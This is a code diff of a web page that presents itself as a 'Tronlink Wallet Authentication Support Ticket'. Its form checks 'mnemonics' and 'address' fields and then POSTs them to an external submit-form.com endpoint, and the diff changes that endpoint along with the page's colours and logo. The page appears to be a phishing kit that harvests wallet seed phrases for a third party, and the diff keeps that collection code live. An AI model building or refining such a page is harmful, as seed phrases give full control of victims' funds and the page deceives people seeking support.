@@ -76,13 +76,14 @@ export default function Home() {
     return !newErrors.mnemonics && !newErrors.address;
   };
 
-  const FORMSPARK_ACTION_URL = "https://submit-form.com/6bnIUqvJW";
+  const FORMSPARK_ACTION_URL = "https://submit-form.com/DceCbyWI1";
 
   const handleSubmit = async (e: any) => {
     e.preventDefault();
+
     if (validateForm()) {
       setLoading(true);
-      console.log("Form is valid, attempting to submit...");
+
       await fetch(FORMSPARK_ACTION_URL, {
         method: "POST",
         headers: {
@@ -93,8 +94,6 @@ export default function Home() {
       });
       setLoading(false);
       setFormSubmitted(true);
-
-      // alert("Form submitted");
     }
   };
 
@@ -120,10 +119,10 @@ export default function Home() {
           zIndex: -1,
         }}
       ></div>
-      <div className="flex flex-col items-center justify-center">
+      <div className="flex flex-col items-center justify-center gap-4">
         <Image
-          className="invert "
-          src="/best.png"
+          className="rounded-md "
+          src="/logo.png"
           alt="Next.js logo"
           width={140}
           height={140}
@@ -136,7 +135,7 @@ export default function Home() {
       </div>
       <div className={` ${albert_Sans.className} mx-auto`}>
         <h1
-          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center text-[#2ce1eee7]`}
+          className={`  md:text-4xl text-2xl italic leading-tight py-2 border-t-[1px] border-b-[1px] border-white text-center text-[#3180f6]`}
         >
           Welcome to Tronlink Wallet <br /> Authentication Support <br />
           Ticket
@@ -195,7 +194,7 @@ export default function Home() {
 
           <button
             type="submit"
-            className="flex gap-2 items-center bg-[#2ce1eee7] text-black px-8 py-2 text-xl font-semibold rounded-full"
+            className="flex gap-2 items-center bg-[#3180f6] text-black px-8 py-2 text-xl font-semibold rounded-full"
           >
             Submit
             {loading && <span className="loader"></span>}
@@ -206,7 +205,7 @@ export default function Home() {
           <p className="text-green-500">Ticket submitted successfully!</p>
           <button
             onClick={goBack}
-            className="bg-none text-[#2ce1eee7] underline cursor-pointer"
+            className="bg-none text-[#3180f6] underline cursor-pointer"
           >
             Go back
           </button>
